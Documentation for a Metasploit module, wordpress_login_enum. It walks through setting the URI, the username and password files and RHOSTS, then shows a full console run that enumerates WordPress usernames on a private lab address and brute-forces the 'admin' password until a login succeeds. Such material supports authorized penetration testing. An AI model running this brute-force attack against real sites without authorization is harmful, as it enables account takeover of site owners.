## Descriptions

This auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/wordpress_login_enum```
2. Do: ```set URI [URI]```
3. Do: ```set PASS_FILE [password file]```
4. Do: ```set USER_FILE [username list file]```
5. Do: ```set RHOSTS [IP]```
6. Do: ```run```

Configure the module first by pointing it to the path of wp-login.php on the target server. Set the username and password files, set the RHOSTS value, and let it run.

## Scenarios

**Running the scanner**

```
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > show options

Module options (auxiliary/scanner/http/wordpress_login_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   BLANK_PASSWORDS      false            no        Try blank passwords for all users
   BRUTEFORCE           true             yes       Perform brute force authentication
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   ENUMERATE_USERNAMES  true             yes       Enumerate usernames
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE_END            10               no        Last user id to enumerate
   RANGE_START          1                no        First user id to enumerate
   RHOSTS                                yes       The target address range or CIDR identifier
   RPORT                80               yes       The target port (TCP)
   SSL                  false            no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TARGETURI            /                yes       The base path to the wordpress application
   THREADS              1                yes       The number of concurrent threads
   USERNAME                              no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   VALIDATE_USERS       true             yes       Validate usernames
   VERBOSE              true             yes       Whether to print output for all attempts
   VHOST                                 no        HTTP server virtual host

msf auxiliary(wordpress_login_enum) > set URI /wordpress/wp-login.php
URI => /wordpress/wp-login.php
msf auxiliary(wordpress_login_enum) > set PASS_FILE /tmp/passes.txt
PASS_FILE => /tmp/passes.txt
msf auxiliary(wordpress_login_enum) > set USER_FILE /tmp/users.txt
USER_FILE => /tmp/users.txt
msf auxiliary(wordpress_login_enum) > set RHOSTS 192.168.1.201
RHOSTS => 192.168.1.201
msf auxiliary(wordpress_login_enum) > run

[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Running User Enumeration
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'administrator'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'administrator'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'admin'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration- Username: 'admin' - is VALID
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'root'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'root'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'god'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'god'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Found 1 valid user
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Running Bruteforce
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Skipping all but 1 valid user
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:''
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'root'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'admin'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'god'
[-] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
[*] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'s3cr3t'
[+] http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - SUCCESSFUL login for 'admin' : 's3cr3t'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wordpress_login_enum) >
```

As you can see in the above output that the module is efficient as it only brute-forces passwords against valid usernames and the scan did indeed turn up a valid set of credentials.